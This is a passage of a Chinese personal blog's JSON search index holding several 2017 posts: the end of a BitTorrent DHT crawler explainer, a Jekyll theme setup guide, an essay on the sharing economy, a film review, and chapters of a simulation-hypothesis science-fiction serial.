另外，用户在DHT网络里的隐私可能会被窃听，因为在DHT网络里跟其他用户交换资源的时候，难免会暴露自己的IP地址，所以别人就会知道你有什么资源，你在请求什么资源了。这也是目前DHT网络里一直存在的一个弱点\n</code></pre>\n    </div>\n    <p>我编写的<a href=\"https://github.com/LEXUGE/DHT-Spider\">DHT-Spider</a>能够通过token和infohash的双重检查来解决第一种缺点。但目前无法解决第二种。<br />\n实际上，爬虫的主要思路是不断地主动find_node来扩充自己的路由表，然后积极回应get_peers和announce_peer,infohash的主要来源也是这两种请求。</p>\n  </li>\n  <li>\n    <p>BitTorrent文件编码与格式：<br />\n整个<code class=\"highlighter-rouge\">.torrent</code>文件采用的是bencode加密，最主要的部分是info字段，是一个字典，包含了文件名，文件大小，infohash，以及sha1散列簇。torrent文件的核心也在此。<br />\n作为一个trackless的脚本，我们不需要添加其他的东西(announce等)，这样可以保证DHT的稳定性和隐蔽性。<br />\n值得注意的是：在编辑torrent文件时，请使用16进制编辑器(比如ghex)。</p>\n  </li>\n  <li>Peer Wire协议：<br />\n在BitTorrent中，节点的寻址通过DHT实现，但是，获取了IP:port之后，实际的数据交换需要Peer Wire协议。\n    <ul>\n      <li>握手：<br />\nPeer Wire协议是Peer之间的通信协议，通常由一个握手消息开始。\n<code class=\"highlighter-rouge\">&lt;pstrlen&gt;&lt;pstr&gt;&lt;reserved&gt;&lt;info_hash&gt;&lt;peer_id&gt;</code><br />\n在BitTorrent协议的v1.0版本, pstrlen = 19, pstr = “BitTorrent protocol”，info_hash是上文中提到的磁力链接中的btih</li>\n    </ul>\n  </li>\n  <li>BitTorrent协议扩展与ut_metadata：<br />\n借助DHT的寻址以及Peer Wire的握手，接下来就可以获取metadata了(包含info字段)。<br />\nMetadata被分块，每个块有16KB(16384字节)，Metadata块从0开始索引，所有块的大小都是16KB，除了最后一个块可能比16KB小。\n    <ul>\n      <li>Extension头部：\nMetadata的扩展使用BEP_0010进行声明，在头部的m字典加入ut_metadata选项并制定metadata的字节数。</li>\n      <li>Extension消息：\n这里的消息采用bencode编码，有三种:\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>0.request(请求):\n请求消息并不在字典中附加任何关键字，这个消息的回复应当来自支持这个扩展的peer，是一个reject或者data消息，回复必须和请求所指出的片相同\nPeer必须保证它所发送的每个片都通过了infohash的检测。即直到peer获得了整个metadata并通过了infohash的验证，才能够发送片(即一个peer应该保证自己已经完整从其他peer中拷贝了一份相同的资源文件后，才能继续响应其他节点的拷贝请求)。Peers没有获得整个metadata时，对收到的所有metadata请求都必须直接回复reject消息\n{'msg_type': 0, 'piece': 0}\nd8:msg_typei0e5:piecei0ee\n这代表请求消息在请求metadata的第一片\n1.data\n这个data消息需要在字典中添加一个新的字段，\"total_size\".这个关键字段和extension头的\"metadata_size\"有相同的含义，这是一个整型\nMetadata片被添加到bencode字典后面，他不是字典的一部分，但是是消息的一部分(必须包括长度前缀)。\n如果这个片是metadata的最后一个片，他可能小于16KB。如果它不是metadata的最后一片，那大小必须是16KB\n{'msg_type': 1, 'piece': 0, 'total_size': 3425}\nd8:msg_typei1e5:piecei0e10:total_sizei34256eexxxxxxxx...\nx表示二进制数据(metadata)\n2.reject\nReject消息没有附件的关键字。它的意思是peer没有请求的这个metadata片信息\n在客户端收到收到一定数目的消息后，可以通过拒绝请求消息来进行洪泛攻击保护。尤其在metadata的数目乘上一个因子时\n{'msg_type': 2, 'piece': 0}\nd8:msg_typei1e5:piecei0ee\n</code></pre>\n        </div>\n      </li>\n      <li>Extension支持交互：<br />\n根据BEP_0010的规定，扩展消息在Peer Wire之后发出，为一个bencode编码的字典：\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"p\">{</span><span class=\"w\">\n </span><span class=\"err\">e:0,</span><span class=\"w\">\n </span><span class=\"err\">ipv4:xxx,</span><span class=\"w\">\n </span><span class=\"err\">ipv6:xxx,</span><span class=\"w\">\n </span><span class=\"err\">complete_ago:1,</span><span class=\"w\">\n </span><span class=\"err\">m:</span><span class=\"w\">\n </span><span class=\"err\">{</span><span class=\"w\">\n   </span><span class=\"err\">upload_only:3,</span><span class=\"w\">\n   </span><span class=\"err\">lt_donthave:7,</span><span class=\"w\">\n   </span><span class=\"err\">ut_holepunch:4,</span><span class=\"w\">\n   </span><span class=\"err\">ut_metadata:2,</span><span class=\"w\">\n   </span><span class=\"err\">ut_pex:1,</span><span class=\"w\">\n   </span><span class=\"err\">ut_comment:6</span><span class=\"w\">\n </span><span class=\"p\">}</span><span class=\"err\">,</span><span class=\"w\">\n </span><span class=\"err\">matadata_size:</span><span class=\"mi\">45377</span><span class=\"err\">,</span><span class=\"w\">\n </span><span class=\"err\">p:</span><span class=\"mi\">33733</span><span class=\"err\">,</span><span class=\"w\">\n </span><span class=\"err\">reqq:</span><span class=\"mi\">255</span><span class=\"err\">,</span><span class=\"w\">\n </span><span class=\"err\">v:BitTorrent</span><span class=\"w\"> </span><span class=\"mf\">7.9</span><span class=\"err\">.</span><span class=\"mi\">3</span><span class=\"w\">\n </span><span class=\"err\">yp:</span><span class=\"mi\">19616</span><span class=\"err\">,</span><span class=\"w\">\n </span><span class=\"err\">yourip:xxx</span><span class=\"w\">\n</span><span class=\"err\">}</span><span class=\"w\">\n</span><span class=\"mi\">1</span><span class=\"err\">.m:是一个字典，表示客户端支持的所有扩展以及每个扩展的编号</span><span class=\"w\">\n </span><span class=\"mi\">1</span><span class=\"err\">)</span><span class=\"w\"> </span><span class=\"err\">ut_pex:表示该客户端支持PEX(Peer</span><span class=\"w\"> </span><span class=\"err\">Exchange)</span><span class=\"w\">\n </span><span class=\"mi\">2</span><span class=\"err\">)</span><span class=\"w\"> </span><span class=\"err\">ut_metadata表示支持BEP</span><span class=\"mi\">-0009</span><span class=\"err\">(也就是交换种子文件的metadata)</span><span class=\"w\">\n</span></code></pre>\n        </div>\n        <p>通知交互完成之后，按[“msg_type”: 0, “piece”: piece]的格式逐块向对方请求metadata,最后进行拼接形成info字段。</p>\n      </li>\n    </ul>\n  </li>\n  <li>校验infohash&amp;收尾：<br />\n这一步比较简单，直接对获得的metadata进行转字符串再进行sha1处理即可。<br />\n之后再与已有infohash进行比对。<br />\n最后对信息进行输出和存储。</li>\n</ol>\n\n<p>最后，就完成了！<br />\n具体脚本使用指南参考我的项目，在此不再详述。</p>\n"
    } ,
  
    {
      "title"    : "Jekyll配置指北",
      "category" : "",
      "tags"     : "网络, 计算机技巧",
      "url"      : "/jekyll/update/2017/07/21/Jekyll%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8C%97.html",
      "date"     : "2017-07-21 11:54:00 +0800",
      "content"  : "<p>本站的每一处都可以见到原子效果动态背景，科技感十足。实际上，这是一个JS脚本。<br />\n以Jekyll的原生主题minima为例，我们进行配置。</p>\n<ol>\n  <li>获取minima主题的绝对路径：<br />\n在高版本的Jekyll中，minima是隐藏的。所以我们需要获取绝对路径。<br />\n在你的BLOG的根目录下：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>bundle show minima\n</code></pre>\n    </div>\n    <p>这会输出minima的绝对路径。</p>\n  </li>\n  <li>获取配置好的主题：<br />\n<a href=\"/download/minima-2.1.zip\">Jekyll-minima-科技感配置</a><br />\n下载好后，解压，将particles.js剪切到BLOG的根目录，并将剩下的整个配置文件夹替换原来的minima。\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo rm -rf [minima的绝对路径]\nsudo cp -r minima-2.1.0 [minima的绝对路径减少一级]\n</code></pre>\n    </div>\n  </li>\n  <li>完成!</li>\n</ol>\n"
    } ,
  
    {
      "title"    : "漫话“共享”",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2017/07/16/%E6%BC%AB%E8%AF%9D-%E5%85%B1%E4%BA%AB.html",
      "date"     : "2017-07-16 21:01:00 +0800",
      "content"  : "<p><img src=\"/image/共享单车.jpg\" alt=\"\" />\n<br /></p>\n<blockquote>\n  <p>共享经济为人们带来许多生活上的方便，我们可以随时享受出行的便利，直接扫玛骑上共享单车。更早的，2016年时的“互联网出租车”、“专车”等服务也是共享经济的体现。好处不必多说，实实在在的作用也在生活中有所体现。但是，“共享”真的能“经济化”吗？这篇文章将不会谈论表象上的问题，诸如单车乱丢等，而是会窥探共享经济的本质，共享经济究竟是不是披着羊皮的狼？</p>\n</blockquote>\n\n<p>首先，我们需要知道共享经济是什么。共享经济是指拥有闲置资源的机构或个人有偿让渡资源使用权给他人，让渡者获取回报，分享者利用分享自己的闲置资源创造价值。实际上，作为这种人与人真诚交换的，共产主义的“各尽所能，按需分配”很早就已经提出了。共享经济只是搭着共产主义的顺风车而以。<br />\n<br />\n甚至，共享经济还时曲解共产主义的。共产主义的“物质生产极大丰富，各尽所能，按需分配”实际上的含义是：随着我们生产力的提高，每个人将自己的一部分劳动力贡献给社会，社会集合起来后，我们再向社会索取我们需要的一部分。再这当中，强调的是贡献和索取的平衡，其中的“社会”的存在只是中转站而以，并不索取什么。但是现在，共享经济做的又是什么呢？以专车为例，网约车平台既不提供车辆，又不为司机提供安全保障，同时，这也是对消费者安全的不负责。实际上，这是阉割了的共产主义，把共产主义作为一种交易的方式存在，本身不符合共产主义的意义，但在资本主义当道的世界中也无可厚非。但其次，最让人痛恨的是，网约车平台乘机成为了“社会”的角色，本身并不对双方负责还要抽取利润，简直就是新时代的地主，甚至比地主还不如。因为他们的“地”也不是自己的。这样一种平台的出现，除了内心中还也还不清的道德罪，还有什么需要承担的呢？</p>\n\n<p><br />\n不光是自己淌着灰色地带，共享经济还带来许多浅层的社会问题。共享经济公司宣称是让社会变得更美好。但是，双方都是普通人的情况下，他们的服务质量可靠吗？我们实际上在选择共享经济的同时放弃了法律的保护。作为一个处于灰色地带的行业，双方都不需要严格履行职责，我们在获取便利的同时其实放下了法律武器。你试想过吗：你乘坐的专车司机不认路，你乘坐的共享单车被人吐过唾沫。我们又找谁去说法？我们既是使用者又是劳动者，公司完全可以试图把义务撇得一干二净。到头来还是我们吃亏。<br />\n<br />\n既是上面的问题被解决，共享主义这个“资本主义”和“共产主义”的混合产物照样还是面临着巨大的问题：资源分配。共享经济的原意是希望资源平等分配，甚至一度被认为是劫富济贫的罗宾汉一般的存在。但是，以一个很简单的例子说明：现在，在一二线城市，我们想要一辆普通的出租车是不是更难更贵了？老年人呢？没有手机的人呢？他们还能打到车吗？很显然这一切都变得困难起来，但是实际上，出租车的数量并没有变化，但是越来越低的门槛和低价低质的服务不得不让传统出租车行业为服务涨价。老年人，原本就并不怎能打到车的群体，现在更是丧失了打车的权力。这一切都是共享经济造成的，原本是为了平分资源，现在还是落到了资源集中的地步。原本为了降低门槛现在反而提高了弱势群体的门槛。<br />\n<br />\n试想一下，共享单车的总使用人数总是要比投放数量多的，这意味着公司可以有一大笔并不受到风险的资金可以去做别的事，一目前的用户基数来看，这不会是一笔小数目，这笔钱他们在干什么，怎么干，我们清楚吗，我们能监管吗？我们甚至在放弃自己的监管权力。共享经济背后的公司们以非共享公开的理念做事，打着共享的幌子，进行融资回扣。这样的公司本身就是背道而驰的。<br />\n<br />\n如同同时期许多的互联网泡沫一样，我们人类社会的发展还没能发展到如此乌邦托的地步，我们的自身水平还为如此发达。我们最终还是需要法律来规范共享经济的行为，让一切又归可循。共享经济并不一定是错的，真正的成功是在未来的某一刻。</p>\n"
    } ,
  
    {
      "title"    : "为梦仰望",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2017/07/10/%E4%B8%BA%E6%A2%A6%E4%BB%B0%E6%9C%9B.html",
      "date"     : "2017-07-10 20:18:00 +0800",
      "content"  : "<p>No Fear In My Heart: <audio src=\"/music/No Fear In My Heart.mp3\" controls=\"controls\" loop=\"loop\" preload=\"meta\"></audio><br />\n<br />\n这是一个关于信仰的故事，这是一个关于每个生命内心的呐喊，这是一段对追随信仰的记录。<br />\n电影讲述了一支真实的朝圣队伍，在藏历新年从芒康朝拜去拉萨，尔后又去往神山冈仁波齐朝圣的故事。这一年正是神山冈仁波齐的本命年。每一个人都怀揣着自己的梦想、希望与抱负，但却走在了一起，11人踏上了历时一年，长达2000公里的朝圣之路。<br />\n他们的每个人都有自己的生活追求与梦想，但却又是什么使他们团结得走到一起？是信仰？是，然而又不全是。他们都信仰着藏传佛教，信仰着冈仁波齐，但是因为梦想不同，他们的信念不同，对信仰的看法也不同。</p>\n\n<p>影片中，各个角色都曾发表过自己对上天的看法。有人曾经说过：“自己并没有做过什么对不起人的事情，但是为何自己家盖房子就会死二伤二呢？”这事实上比任何地方的朝圣者都要来的真实，他们反映出信仰者们对信仰的怀疑。之后，又有人说：“磕头磕出血，只能说是你磕得用心，磕得虔诚，是对信仰也是对自己的虔诚。”着表现出来了人们对于信仰怀疑之后的包容。<br />\n人，总需要仰望点什么。为梦仰望，为在自己的梦想选择自己的信仰。信仰和梦想，如同诗和远方，诗和信仰，不切实际但给你执着的内心，而梦想和远方，是对未来的渴望与眺望。执着得久，走得越久，望得越远，走得越远。虽然，我们不一定走到了梦想的位置，但他们带动着我们向远方前进。你得远方可以不切实际，可以天马行空，只要你对他有足够虔诚的信仰，并且不忘初心。那么你一定可以到达你意想不到的地方，得到充满惊喜的未来。<br />\n在拉萨的拍摄现场，片中朝圣者因为配合拍摄，被其他朝圣者吐口水，一度放弃拍摄。直到一位喇嘛开导：“如果你们觉得做的事是正确的，那又何必害怕别人朝你吐口水呢。”诚然如此，只要你觉得正确，又何必害怕？这个世界上没有什么生活方式是完全正确的，远方不是终点，达不到也不必遗憾，但是我们必须接受平凡的自我，去大胆地想象，去大胆地做，又何必在意或害怕别人的看法呢？著名法国哲学家萨特说过：“他人即地狱”。我们不要因为成为“对象我”而失去对初心的追求。<br />\n信仰，可以是任何东西，可以是一个项目，一门技术，一个伟人等等。但它必须超脱功利价值的存在，这样，信仰才会“有趣”。为梦想二存在的信仰才是有价值的。<br />\n如同影片中屠夫的赎罪，他要为自己的灵魂的赎罪，这就是对自己价值的提升，所以，他信仰了。<br />\n若干年后，我们可能会嘲笑自己幼稚，但是无论如何，为梦仰望，接受平凡而又不甘平凡，努力活出最好的我，不为未来留下遗憾。</p>\n"
    } ,
  
    {
      "title"    : "幕后 第三章",
      "category" : "",
      "tags"     : "幕后系列, 随笔",
      "url"      : "/jekyll/update/2017/07/06/%E5%B9%95%E5%90%8E-%E7%AC%AC%E4%B8%89%E7%AB%A0.html",
      "date"     : "2017-07-06 21:43:00 +0800",
      "content"  : "<p>坐标：地球-比利时-布鲁塞尔 时间：地球纪元2033年<br />\n这次，自由人重新选择了一个地方作为其总部所在地。这一天，全球几乎所有的大国都坐在一张谈判桌上。自由人经过98年的发展，显然已经超越了联合国，成为了全世界最强的联合组织。<br />\n刘辉是中国方面（也是泛亚太联盟）的协调员。<br />\n这一次紧急召开如此大规模的会议，最主要的目的就是就“如何应对我们的宿主文明”展开讨论。显然，各方的意见也是十分不统一。<br />\n马克·瑟里奇，是北约方面的技术顾问：“如果我的逻辑推论没有疏漏的话。那这个问题就是关乎命运的大问题。我们现在的一举一动都处于宿主文明的监视之下，而我们一切的一切，也不就是他们硬盘中的数据，内存中的程序而以，想要毁灭，简直是在简单不过的事情。为了我们的安全，自由人总部全部被概率云包裹，只要宿主文明不派出观察者，那我们的一举一动都是处于叠加状态的——总而言之，本次会议是绝对安全的。”<br />\n“经过一段时间的研究，我们泛亚太联盟同意宿主文明的存在这一说法。但是作为宿主文明的囊中之物，就是大战爆发，过程当中宿主文明随随便便拔掉电源也不算是不可以。那我们取胜的可能性就很小。如果可以的话，尽量避免大战地发生，即使不可避免，那也得至少是来到宿主文明的世界之后再引发战争，这样我们才可能有胜算。”泛亚太联盟中方军事委员长常磊强说。\n“谈判，这简直是太可笑了，我们寄人篱下，活不活着还要看他们脸色，什么时候我们还能讲条件了？”，欧盟理事会主席马修·鲁克斯极尽嘲讽地说。<br />\n“那欧盟你们的意思？”常委员长抱着一种疑惑而不相信的心，严肃但又有所看洋相地问。</p>\n\n<p>果不其然，欧盟退缩了：“一定要求我们来评判的话，我们更加愿意怀疑研究结果的准确性。我们现在一切的设想与担心都存在于理论报告，很多时候为何一定要纠结得如此之深。”，马修回避道。<br />\n“这也实在是太荒唐了，至少，欧盟的想法我就持反对意见。”，一边从未发言，几乎快要被人忘却的刘辉说：“我们尽量还是要持宁可信有，不可信无的态度，毕竟，我们是在不利位置的。当然，我还是想知道一下北约方面的看法。”说完，刘辉满脸期待地看向马克·瑟里奇。<br />\n的确，北约方面的态度很能决定最终的结局。<br />\n“我们的态度，很显然就是希望能够与宿主文明大战一场，当然并不是硬着来，我们希望找到我们所在的复杂系统的一些漏洞，进入宿主文明的世界，之后毁灭宿主文明。再之后把所有人类转移出来。”，马克·瑟里奇说。<br />\n“那有这方面的线索吗？”，刘辉问。<br />\n常磊说：“如果有大概可行的线索的话，泛亚太方面表示支持”。常磊似乎希望能与北约方面展开合作。<br />\n“漏洞的线索的话，我们有一定完备的理论”，马克·瑟里奇说：“这个理论其实也是我们存在宿主文明的一个证明。当然这方面的理论才刚开始研究。可观察的宇宙可能是一个翻过来的黑洞。也就是说，我们如果能够来到宇宙视界（这个部分存在着我们周围三维全息世界的二维信息）。所以说，这个巨型黑洞的视界可能就是这台计算机的硬盘，我们在那里就可以更改我们的世界，来造成一些系统异常，甚至可能可以来到宿主文明的世界。”<br />\n“但是光速都无法出逃，那我们又如何到达视界表面呢？”马修·鲁克斯问。<br />\n“这个问题问得很好。”马克·瑟里奇说，“所以说这也是我们目前想知道的。”\n“当然，目前我们能够制造出一些小型的引力波，而引力波是可以逃出黑洞的，或许，借助这种波浪，我们可以逃出去，只是需要一块靠谱的冲浪板。”<br />\n“我们愿意与北约进行研究”常磊说。<br />\n马修·鲁克斯还是处于不置可否的态度：“既然你们都愿意远征，那我们就留下来保护地球吧。”<br />\n当天，北约就和泛亚太联盟组织了“远征者”太空舰队，而欧盟则是集中力量研究保护地球的措施。<br />\n“如果我们可以出逃，那么就必须是带着地球出逃，所以，我们只有一次机会，当然，我们也希望欧盟能够制造一层坚固的保护罩来保护我们的飞船——地球。”<br />\n“也就是我们要带着地球漂泊？”刘辉说。<br />\n“是的”马克·瑟里奇说。<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：地球-比利时-布鲁塞尔-北约总部 时间：地球纪元2033年<br />\n刘辉与马克·瑟里奇就“远征者”的具体技术细节进行商议。<br />\n“我们首先必须要有一支舰队来为地球这只冲浪板护航。”马克·瑟里奇说。<br />\n“目前我很怀疑我们是否能制造出强大的引力波。因为至少我们的技术实力还处于实验阶段，远远不能支持对整支舰队甚至整个地球的‘冲浪’”刘辉严肃地说。<br />\n“所以我认为我们有必要制造一个非常强大的引力波，但是我们制造不出来”马克·瑟里奇说。<br />\n“那就是需要我们进入黑洞？”刘辉问。<br />\n“也许是的”马克·瑟里奇看起来很轻松，似乎早在他的意料之中。<br />\n<br /></p>\n<hr />\n\n<p><br /><br />\n坐标：美国-华盛顿·哥伦比亚特区-五角大楼 地球纪元2033年<br />\n五角大楼得知需要进入时。就开始派遣大量人员研究太空舰队。北约方面投入了大量的资金。<br />\n为了能够使飞船内的人员安全存活，这就意味着需要有足够强度的材料来制造整个船体，而且飞船必须具有足够强大的动力，在黑洞表面借助引力波之力迅速飞离，去往遥远的地方寻找引力波来到宇宙这个黑洞的表面。<br />\n事实上，这个项目的核心难点也并不在于材料的强度，而在于飞船引擎能不能在表面达到逃逸速度。所以亚瑟·霍普金斯，汤姆·惠灵顿组成的研究小组展开了这方面的研究。</p>\n"
    } ,
  
    {
      "title"    : "幕后 第二章",
      "category" : "",
      "tags"     : "幕后系列, 随笔",
      "url"      : "/jekyll/update/2017/07/05/%E5%B9%95%E5%90%8E-%E7%AC%AC%E4%BA%8C%E7%AB%A0.html",
      "date"     : "2017-07-05 13:31:00 +0800",
      "content"  : "<p>坐标：GN-z11星系-GNR-《宇宙》与S-M系统控制中心 时间：GN纪元后世代26941年<br />\nS-M的设计和维护团队，《宇宙》系统的设计团队，以及元首一同在控制中心的会议室中。<br />\n“诸位，根据我们的日志显示，人类正在逐渐意识到整个《宇宙》系统的存在，似乎也间接认识到，我们作为第二个上帝，造世主一般的存在。”S-M的总架构设计师道，显然，S-M在对于如此重要而矛盾的处理上很是力不从心。<br />\n“那目前有威胁到宇宙的保护系统吗？”似乎，《宇宙》团队更加关心这个问题。<br />\n“并没有，他们目前还没有能够飞出太阳系的技术能力，所以目前来说很安全。但是，虽然他们无法在系统中闹出一番大动静，但是，既然他们意识到了我们的存在，我觉得，为了安全考虑应该扼杀人类。”S-M的安全顾问说。<br />\n话音刚落，《宇宙》的总设计师忽然跃起，猛地一敲桌子，咆哮到：“你们这群搞AI的是被机器人三大定律（Three Laws of Robotics,阿西莫夫于1950年提出的，用于保护人类）冲昏头脑了吗？你知道人类目前的发展状态是我们花费多少时间培养的吗？难道我们要为一个不一定存在——不，是根本不存在的威胁而放弃我们的希望吗？我和你们S-M团队坦言吧，我敢保证我们《宇宙》的安全系统是可靠的，是利益最大化的，你这是对我们《宇宙》系统的极度不信任！你们会——”<br />\n“闭嘴！”，元首低沉而有力地说。回声在会议室不断地回荡。<br />\n瞬间，安静了。</p>\n\n<p>“我想，诸位都没有资格判断对错，唯有时间能够检验，但是，就目前看来，《宇宙》系统却是花费了我们大量的心血。如果扼杀了人类，我们就相当于毁了它。《宇宙》是一件无与伦比，精妙绝伦的艺术品，我们不能因为一粒灰尘的玷污而把它摔碎。”<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：地球-美国-华盛顿·哥伦比亚特区-NASA总部休息室 时间：地球纪元公元后2032年<br />\nMark·Surridge（马克·瑟里奇）、Arthur·Hopekins（亚瑟·霍普金斯）、Tom·Herrington（汤姆·惠灵顿）三人坐在休息室里。三个人同时在2025年加入了自由人，同时，也都是NASA远空观测分部的物理与天文顾问。其中，亚瑟毕业于SU（Singularity University,奇点大学，位于美国加州硅谷，由Google和NASA合办），另外两人毕业于MIT（Massachusetts Institute of Technology，麻省理工）。<br />\n“还记得19年前扎克伯格的演讲吗？听起来还有趣。”，马克说道。<br />\n“但是，我觉得这似乎并不能证明真假，如果存在这样的文明，而我们只是生活在他们创造的游戏之中的话，那他们的世界就一定是客观的吗？是不是存在更高级的文明将他们模拟？这就像《盗梦空间》中递归般的梦境一般。”亚瑟说道。<br />\n“我还能再证明你这个命题的不正确性，就如我们所知道的一样，宇宙中所有的能量都是沿着最短路径传播的，但是，假设这个世界是由计算机模拟的，那谁来模拟他们？这不就是背离了最短路径的原则吗？所以，我认为宇宙并不应该如此设计。”亚瑟接着说。<br />\n“那我认为你就错了，亚瑟，我们现在的物理规则都可以是他们设计出来的，而并不是真实的，就像魔兽争霸里的任务要是有思想的话，他们会是多么的违反我们的物理定律，但是这碍事吗？并不妨碍，只要宿主机——也就是模拟我们的计算机——或者说随便是什么物质，只要能够符合他们的物理定律并且能够兼容出我们的物理定律，那就是合理的。”马克说。<br />\n“那他们能够使用各种各样架构的计算机啊，为什么一定要是我们的经典图灵机？”，汤姆反问道。<br />\n“如果，我们的世界就是最上层——也就是我们没有被模拟。但是，我们现在的计算机架构在性能无限强大的情况下时是可以模拟出现在我们的世界的，况且，我们的世界有被模拟的迹象——只要他们的计算机能兼容我们的物理定律，所以，我们的世界一定被模拟，并且可能有多种方法来模拟，这就意味着，上层文明可以有着无限可能。这恰恰更加危险。”，马克回应道。<br />\n两个人思考了一段时间，沉默不语，似乎默认了。<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：地球-美国-门罗帕克 时间：地球纪元公元后2032年<br />\n19年前扎克伯格提出的设想深入每个自由人的心魂之中。Demis Hassabis（杰米斯·哈萨比斯，DeepMind创始人，AlphaGo缔造者，AI从事者心中的偶像）在自由人的总部感叹道：“为什么要有计算机呢？或许，我们知道的太多了，我们拥有了强大的力量，可以去约束世界，可以成为上帝。但是，我们拥有如此强大的力量，却为自己设了一个，迷——我们究竟是不是客观存在的呢？” <br />\n“太多时候，我们以为我们就快到达，却发现转角又是一条无尽且泥泞的道路，我们何时才能走到头啊，或许，全人类都已经累了。” <br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：地球-美国-华盛顿·哥伦比亚特区-五角大楼 时间：地球纪元后2033年<br />\n这一天，马克·瑟里奇等三人向自由人总部提交了扎克伯格猜想的进一步论证，这原本的恐惧感离每个自由人心中都越来越近，越来越真实。<br />\n终于，自由人决定将报告提交给三个自由人主要缔约组织的政府：北约、欧盟以及泛亚太联盟。<br />\n为了避免不必要的慌张。三个组织并没有将研究报告公之于众，而是作为绝密档案封存。同时紧急成立了专门的委员会。将各国各个领域的尖端人才全部云集于此。<br />\n“现在，你们要完成一件永远不可能完成的任务，而且是在一个不可能的期限之内，此外，记住，世界的存亡寄托在你们身上。”</p>\n"
    } ,
  
    {
      "title"    : "幕后 第一章",
      "category" : "",
      "tags"     : "幕后系列, 随笔",
      "url"      : "/jekyll/update/2017/07/04/%E5%B9%95%E5%90%8E-%E7%AC%AC%E4%B8%80%E7%AB%A0.html",
      "date"     : "2017-07-04 13:34:00 +0800",
      "content"  : "<blockquote>\n  <p>我现在做的事情，要么毫无意义，要么可能成为牛顿以后物理学上最大的发现。<br />\n——马克思·普朗克</p>\n</blockquote>\n\n<p>坐标：地球-德国-亥姆霍兹研究所 时间：地球纪元公元后1900年<br />\n这一年对于马克斯·普朗克来说具有非同寻常的意义，同样对人类也是。的确，马克斯·普朗克真的要作出牛顿以来物理学上最大的发现。这似乎发现的很是不同寻常。<br />\n庄子云：“一尺之棰，日取其半，万世不竭。”。早在庄子的时代，人类就发现，物体的运动是连续的，物体的性质变化也是连续的，即所有物质的性质都可以无限细分下去。<br />\n然而，到了原子以下的世界，马克斯·普朗克意识到了一些不寻常的变化——物质的能量不再是连续的了，变成了不可分割且分立的量子。<br />\n这个有悖与常识的发现令马克斯·普朗克十分不解。他甚至希望能够推翻自己的发现，不要让它成为现实。但是，多次实验的结果加上马克斯·普朗克敏锐的直觉告诉他：事实便为如此。<br />\n<br /></p>\n<hr />\n\n<p><br /><br />\n坐标：地球-德国 时间：地球纪元公元后1905年<br />\n这一年，爱因斯坦提出了《狭义相对论》，并且给出了著名的E=mc^2。《狭义相对论》中有重要的一条就是光速不变原理，且光速并非无限大的。此外，有趣的是，爱因斯坦还发现了光的波粒二象性。之后的1915年，爱因斯坦提出了《广义相对论》。《广义相对论》认为，因为物质的存在，时间和空间都会发生扭曲，这也就是引力场。<br />\n普朗克常数否决了宇宙可以无限分割的想法，而爱因斯坦的相对论则说明了光速的确定性且并非无限大，以及时间和空间的不稳定性。这一切超出常人思维理解能力的发现几乎颠覆者全人类的世界观，甚至两位发现者都有些难以置信。</p>\n\n<p><br /></p>\n<hr />\n\n<p><br /><br />\n坐标：地球-德国-慕尼黑 时间：地球纪元公元后1935年<br />\n1927年，海森堡提出了不确定性理论，这个理论基于的是爱因斯坦提出的波粒二象性，随后的1935年，薛定谔提出了“薛定谔的猫”的理想实验，将海森堡提出的微观下的不确定性理论转为了宏观上更容易理解的假象，更是印证了不确定性理论。</p>\n\n<p>随着这一切的不合乎常理但却又是准确无误的理论提出，四位具有伟大突破的物理学家来到了德国慕尼黑的圣母教堂。三个人在马克斯·普朗克的带领下径直向前走去，似乎有也没有目的，很是让人心生疑惑。<br />\n突然，马克斯猛地一转身把三个人带入了一个小房间，然后“当——”得一声关上了门，又迅速把门锁上。<br />\n“我这次把你们叫来是要组建一个秘密的组织——当然，并不是宗教方面的，这是关于客观世界的——但是，因为是一个秘密组织，所以，用宗教的外表来遮人耳目也不是不可以。”马克斯·普朗克说道：“我现在做的事情，也是你们现在所做的事情，要么毫无意义——很显然是有意义的，所以这一切将成为牛顿以后物理学上最大的发现，甚至，我们发现的并不再局限于物理了，它可能会改变人类的命运——当然，是祸是福，我们还不知道。”<br />\n“量子力学”，爱因斯坦道。<br />\n“是，但不仅仅是，诸位难道不觉得我们的发现正在问鼎上帝创造的宇宙的边界吗？我们的理论和发现正在一步步接近宇宙的终极，也是我们的终极，正在接近那个终极的答案。”普朗克说：“我们正在一步步推翻祖先所设想的，我们会比他们想得更清晰，更简洁，更透彻。”<br />\n薛定谔与海森堡点点头，思索了一会。<br />\n海森堡说：“那，我们要保守的秘密是什么？”。三个人眼中都充满疑惑，等待着马克斯的解释。<br />\n“我觉得，上帝如此告诉我们，宇宙有限，他的意图很明显——想让我们去接管这个世界。”<br />\n“但是，很明显，我们现在的能力很不合适，难道不是吗？我们都无法问鼎月球，还停留在Science Fiction（SF，即科学幻想或科学小说）中。”薛定谔说，似乎有点浇冷水的意味。<br />\n“你想的很好，也很超前，但是，这就是这个秘密组织的意义所在，我们可以一直发展下去，直到称霸宇宙的那一天到来。”马克斯道：“如果诸位有谁不想为人类的未来着想——我想没有一个科学家会这样吧，可以现在就离开，因为你不适合人类的未来，不配用量子力学与上帝对话。如果没有的话，那我们继续吧！”<br />\n三个人点点头，示意继续。<br />\n“既然你们都同意，那从今天起，我们都是‘自由人’的成员了，你们也作为最初的四名组织创始人。”，马克斯·普朗克说。<br />\n<br /></p>\n<hr />\n\n<p><br />\n坐标：地球-美国-门罗帕克 时间：地球纪元公元后2013年<br />\n此时，自由人已经有百余名成员了，全是各界的名人，西方的一些政客也涉足其中。其中，科技界的人士也不在少数，如：理查德·斯托曼，马克·扎克伯格，拉里·佩奇等。<br />\n这一次在门罗帕克召开的是自由人四年一次的长期会议。<br />\n会议的开头重述了自由人的思想意识形态以及目标。这是每一次的长期会议都会有的。<br />\n然而中段一些高级顾问的汇报演讲有些独具一些趣味性。扎克伯格作为高级顾问，也发表了演讲。<br 